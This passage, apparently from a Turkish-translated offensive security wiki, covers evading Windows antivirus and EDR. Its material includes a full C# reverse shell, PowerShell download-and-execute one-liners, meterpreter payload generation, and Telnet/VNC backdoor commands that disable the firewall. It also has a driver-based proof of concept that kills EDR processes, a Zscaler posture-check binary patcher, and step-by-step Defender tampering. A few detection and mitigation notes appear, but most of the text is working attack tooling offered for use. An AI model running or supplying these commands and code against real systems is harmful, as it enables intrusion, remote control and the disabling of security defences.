:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları loglamasına** izin veren güçlü bir logging mekanizmasıdır. Ancak, kötü amaçlı faaliyetleri izlemek ve tespit etmek için güvenlik ürünleri tarafından da kullanılabilir.

AMSI'nin nasıl devre dışı bırakıldığına (baypas edildiğine) benzer şekilde, kullanıcı alanı prosesinin **`EtwEventWrite`** fonksiyonunun olayları loglamadan hemen dönmesini sağlamak da mümkündür. Bu, fonksiyonun bellekte patchlenerek hemen dönmesi ile yapılır; böylece o proses için ETW logging fiilen devre dışı bırakılmış olur.

Daha fazla bilgi için bakınız **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# binary'lerinin belleğe yüklenmesi uzun zamandır bilinen bir yöntemdir ve post-exploitation araçlarınızı AV tarafından yakalanmadan çalıştırmanın hâlâ çok iyi bir yoludur.

Payload doğrudan diske temas etmeden belleğe yükleneceği için, tüm süreç için AMSI'yi patchlemek tek endişemiz olacaktır.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir kurban (sacrificial) process spawn etmeyi**, post-exploitation kötü amaçlı kodunuzu o yeni prosese inject etmeyi, kodu çalıştırmayı ve iş bittikten sonra yeni prosesi öldürmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation sırasında bir şeyler ters giderse veya yakalanırsa, implantımızın hayatta kalma şansının **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma ihtimalinizin **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation kötü amaçlı kodu **kendi procesine** inject etmeyi içerir. Bu sayede yeni bir proses oluşturup AV tarafından taranmasını önleyebilirsiniz, ancak çalıştırma sırasında bir şeyler ters giderse beacon'ınızı kaybetme olasılığı **çok daha fazladır** çünkü proses crash edebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eğer C# Assembly yükleme hakkında daha fazla okumak isterseniz, bu makaleye bakın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'unu ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly'lerini **PowerShell'den** de yükleyebilirsiniz; bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosu](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), kompromize makineye **Attacker Controlled SMB share**'e kurulu interpreter ortamına erişim vererek diğer diller kullanılarak kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Interpreter Binaries ve ortama erişim verilerek, bu dillerdeki kodları kompromize makinenin belleği içinde **rasgele kod çalıştıracak şekilde** yürütmek mümkün olur.

Repo şöyle belirtiyor: Defender hâlâ scriptleri tarıyor ama Go, Java, PHP vb. kullanarak **statik imzaları baypas etme konusunda daha fazla esnekliğimiz** oluyor. Bu dillerde rastgele, obfuskasyonsuz reverse shell script'leri ile yapılan testler başarılı oldu.

## TokenStomping

Token stomping, bir saldırganın **erişim token'ını veya EDR ya da AV gibi bir güvenlik ürününü** manipüle etmesine izin veren bir tekniktir; böylece sürecin ölmemesini sağlarken, kötü amaçlı etkinlikleri kontrol etme yetkilerini azaltır.

Bunu önlemek için Windows, güvenlik süreçlerinin token'ları üzerinde dış proseslerin handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Bu blog yazısında açıklandığı gibi [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), mağdurun PC'sine Chrome Remote Desktop'ı kurup sonra onun üzerinden takeover ve persistence sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Installer'ı mağdur makinede sessizce çalıştırın (admin gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next'e tıklayın. Kurulum sihirbazı sizden yetki isteyecek; devam etmek için Authorize düğmesine tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI kullanmadan pin belirlemeye izin veren pin parametresine dikkat edin).

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını dikkate almanız gerekir, bu yüzden olgun ortamlarda tamamen fark edilmeden kalmak neredeyse imkansızdır.

Her ortama karşı farklı güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94)'ın bu konuşmasını izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu ayrıca Evasion in Depth hakkında [@mariuszbit](https://twitter.com/mariuszbit) tarafından verilmiş başka harika bir konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi parçaları zararlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanarak binary'nin parçalarını **kaldırana** kadar test edebilir ve hangi kısmın Defender tarafından zararlı bulunduğunu tespit edip size ayırabilir.\
Aynı işi yapan bir diğer araç ise [**avred**](https://github.com/dobin/avred) ve açık web üzerinden hizmeti sunuyor: [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, yönetici olarak yükleyebileceğiniz bir **Telnet server** ile geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlamasını** sağla ve şimdi **çalıştır**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştirin** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini istiyorsunuz, setup değil)

**ON THE HOST**: _**winvnc.exe**_ çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ için bir parola belirleyin
- _View-Only Password_ için bir parola belirleyin

Sonra, ikili _**winvnc.exe**_ ve **yeni** oluşturulan dosya _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker** kendi **host**'unda `vncviewer.exe -listen 5900` ikilisini **çalıştırmalı**; böylece reverse **VNC connection** yakalamaya **hazır** olur. Sonra, **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` çalıştırın

**UYARI:** Gizliliği korumak için aşağıdakileri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- `UltraVNC.ini` aynı dizinde yokken `winvnc`'i başlatmayın veya [the config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT'nin içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister**'ı `msfconsole -r file.rc` ile **başlatın** ve **xml payload**'ı şu komutla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracak.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şu komutla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Bununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# ile derleyici kullanımı
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuskasyon araçları listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Enjektör oluşturmak için Python örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603, fidye yazılımını bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** adlı küçük bir konsol aracından yararlandı. Araç, **kendi kırılgan fakat *signed* sürücüsünü** getiriyor ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemediği ayrıcalıklı kernel işlemleri yapmak için bunu suiistimal ediyor.

Anahtar çıkarımlar
1. **Signed driver**: Diske teslim edilen dosya `ServiceMouse.sys` iken, ikili dosya Antiy Labs’in “System In-Depth Analysis Toolkit”inden meşru şekilde imzalanmış sürücü `AToolsKrnl64.sys`’dir. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **çekirdek servisi** olarak kaydeder ve ikinci satır bunu başlatarak `\\.\ServiceMouse`'ın kullanıcı modundan erişilebilir olmasını sağlar.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Rastgele bir süreci PID ile sonlandır (Defender/EDR servislerini öldürmek için kullanıldı) |
| `0x990000D0` | Diskteki rastgele bir dosyayı sil |
| `0x990001D0` | Sürücüyü unload edip servisi kaldır |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD kullanıcı modu korumalarını tamamen atlar; çekirdekte çalışan kod *protected* süreçleri açabilir, onları sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özelliklerinden bağımsız olarak çekirdek nesnelerine müdahale edebilir.

Tespit / Hafifletme
•  Microsoft’un zayıf sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirerek Windows’un `AToolsKrnl64.sys`'i yüklemeyi reddetmesini sağlayın.  
•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü dünya-yazılabilir bir dizinden yüklendiğinde veya izin listesinden (allow-list) olmadığında uyarı verin.  
•  Özel aygıt nesnelerine yönelik kullanıcı modu handle'larını ve bunları takip eden şüpheli `DeviceIoControl` çağrılarını takip edin.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’ın **Client Connector**'ı cihaz-duruş kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. Tam bir bypass'ı mümkün kılan iki zayıf tasarım tercihi vardır:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (sunucuya bir boolean gönderilir).  
2. İç RPC endpoint'leri bağlanan yürütülebilir dosyanın **Zscaler tarafından imzalanmış** olduğunu (`WinVerifyTrust` aracılığıyla) doğrulamakla yetinir.

Diskteki **dört signed binary'yi patch'leyerek** her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | `1` döndürür, böylece her kontrol uygun kabul edilir |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ herhangi bir (imzasız bile) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kısa devre yaptı |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirip servis yığını yeniden başlattıktan sonra:

* **Tüm** durum kontrolleri **yeşil/uyumlu** olarak görünür.
* İmzalanmamış veya değiştirilmiş ikili dosyalar, adlandırılmış pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* İhlal edilen host, Zscaler politikaları tarafından tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, salt istemci tarafı güven kararlarının ve basit imza kontrollerinin birkaç byte'lık yama ile nasıl atlatılabileceğini gösteriyor.

## Protected Process Light (PPL) kullanarak LOLBINs ile AV/EDR'e müdahale

Protected Process Light (PPL), yalnızca aynı veya daha yüksek düzeydeki korumalı süreçlerin birbirlerine müdahale edebilmesine izin veren bir imzalayan/seviye hiyerarşisi uygular. Saldırgan olarak, meşru şekilde bir PPL-enabled binary'yi başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, zararsız bir işlevi (ör. kayıt tutma) AV/EDR tarafından kullanılan korumalı dizinlere karşı sınırlı, PPL destekli bir yazma yeteneğine dönüştürebilirsiniz.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikili `C:\Windows\System32\ClipUp.exe` kendini başlatır ve çağıranın belirttiği yola bir log dosyası yazmak için bir parametre kabul eder.
- PPL süreci olarak başlatıldığında, dosya yazma işlemi PPL desteğiyle gerçekleşir.
- ClipUp boşluk içeren yolları çözümlüyemez; normalde korumalı konumlara işaret etmek için 8.3 kısa yollarını kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listele: her üst dizinde `dir /x`.
- cmd içinde kısa yolu türet: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL özellikli LOLBIN (ClipUp) bir launcher kullanılarak `CREATE_PROTECTED_PROCESS` ile başlatılır (ör. CreateProcessAsPPL).
2) ClipUp log-yolu argümanı, korumalı bir AV dizininde (ör. Defender Platform) dosya oluşturmayı zorlamak için verilir. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili normalde AV tarafından çalışırken açık/kitleniyorsa (ör. MsMpEng.exe), yazmayı AV başlamadan önce önyüklemeye zamanlayın; bunun için daha erken güvenilir şekilde çalışan bir auto-start service kurun. Önyükleme sırasını Process Monitor (boot logging) ile doğrulayın.
4) Yeniden başlatmada PPL destekli yazma, AV'nin ikililerini kilitlemesinden önce gerçekleşir; hedef dosyayı bozar ve başlatılmasını engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlar
- ClipUp'un yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; primitif hassas içerik enjeksiyonundan ziyade bozmaya uygundur.
- Bir servisi yüklemek/başlatmak için yerel admin/SYSTEM ve bir yeniden başlatma penceresi gerekir.
- Zamanlama kritik: hedef açık olmamalı; önyükleme zamanı yürütme dosya kilitlerini önler.

Tespitler
- Önyükleme sırasında, özellikle standart dışı başlatıcılar tarafından üst işlemi olan, olağandışı argümanlarla `ClipUp.exe` işlem oluşturulması.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış yeni servisler ve Defender/AV'den önce tutarlı şekilde başlayan servisler. Defender başlatma hatalarından önce servis oluşturma/değişikliklerini araştırın.
- Defender ikili dosyaları/Platform dizinlerinde dosya bütünlüğü izleme; protected-process flag'larına sahip işlemler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetri: `CREATE_PROTECTED_PROCESS` ile oluşturulan işlemleri ve AV olmayan ikili dosyalar tarafından anormal PPL seviye kullanımlarını kontrol edin.

Önlemler
- WDAC/Code Integrity: hangi imzalı ikili dosyaların PPL olarak çalışabileceğini ve hangi parent'lar altında çalışabileceklerini kısıtlayın; meşru bağlamlar dışındaki ClipUp çağrılarını engelleyin.
- Servis hijyeni: otomatik başlatılan servislerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch protections'ın etkin olduğundan emin olun; ikili dosya bozulmasını gösteren başlangıç hatalarını araştırın.
- Ortamınızla uyumluysa güvenlik araçlarını barındıran hacimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı düşünün (iyi test edin).

PPL ve araçlar için referanslar
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender, çalışacağı platformu şu alt klasörleri sıralayarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Sözlük sırasına göre en yüksek sürüm string'ine sahip alt klasörü seçer (ör. `4.18.25070.5-0`) ve Defender servis işlemlerini oradan başlatır (servis/registry yollarını buna göre günceller). Bu seçim, dizin reparse noktaları (symlinkler) dahil dizin girdilerine güvenir. Bir yönetici bunu kullanarak Defender'ı saldırgan tarafından yazılabilir bir yola yönlendirebilir ve DLL sideloading veya servis aksatması gerçekleştirebilir.

Önkoşullar
- Local Administrator (Platform klasörü altında dizinler/symlink'ler oluşturmak için gerekli)
- Yeniden başlatma yapabilme veya Defender platform yeniden seçimini tetikleyebilme (önyüklemede servis yeniden başlatma)
- Sadece yerleşik araçlar gerekli (mklink)

Neden işe yarar
- Defender kendi klasörlerine yazılmasını engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlenip çözülmediğini doğrulamadan sözlük sırasına göre en yüksek sürüm olan klasörü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın, örn. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunu `C:\TMP\AV\` altında ve hizmet yapılandırmasının/kayıt defterinin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation options
- DLL sideloading/code execution: Defender'ın uygulama dizininden yüklediği Drop/replace DLLs ile Defender süreçlerinde kod çalıştırın. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın; böylece bir sonraki başlatmada yapılandırılmış yol çözümlenmez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin tek başına ayrıcalık yükseltme sağlamadığını unutmayın; yönetici hakları gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamler, runtime evasion'ı C2 implant'ından çıkarıp hedef modülün kendisine taşıyabilir; bunu Import Address Table (IAT) üzerinde hook yapıp seçili API'leri saldırgan kontrolündeki, position‑independent code (PIC) üzerinden yönlendirerek yaparlar. Bu yaklaşım, birçok kitin (ör. CreateProcessA gibi) maruz bıraktığı küçük API yüzeyinin ötesinde evasion'u genelleştirir ve aynı korumaları BOFs ve post‑exploitation DLLs için de genişletir.

High-level approach
